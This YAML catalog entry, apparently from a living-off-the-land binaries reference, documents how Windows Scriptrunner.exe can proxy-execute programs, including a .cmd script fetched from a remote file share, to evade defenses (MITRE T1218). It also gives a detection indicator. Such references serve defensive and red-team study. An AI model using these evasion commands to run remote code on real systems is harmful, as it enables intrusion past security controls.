---
name: Scriptrunner.exe
description: 
functions:
  execute:
    - description: Executes calc.exe
      code: Scriptrunner.exe -appvscript calc.exe
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute binary through proxy binary to evade defensive counter measurments
    - description: Executes calc.cmde from remote server
      code: ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute binary through proxy binary  from external server to evade defensive counter measurments
resources:
    - resource: https://twitter.com/KyleHanslovan/status/914800377580503040
    - resource: https://twitter.com/NickTyrer/status/914234924655312896
    - resource: https://github.com/MoooKitty/Code-Execution
fullpath:
    - path: C:\Windows\System32\scriptrunner.exe
    - path: C:\Windows\SysWOW64\scriptrunner.exe
detection:
  - IOC: Scriptrunner.exe should not be in use unless App-v is deployed
acknowledgement:
  - Person: Nick Tyrer
    Handle: '@nicktyrer'
---
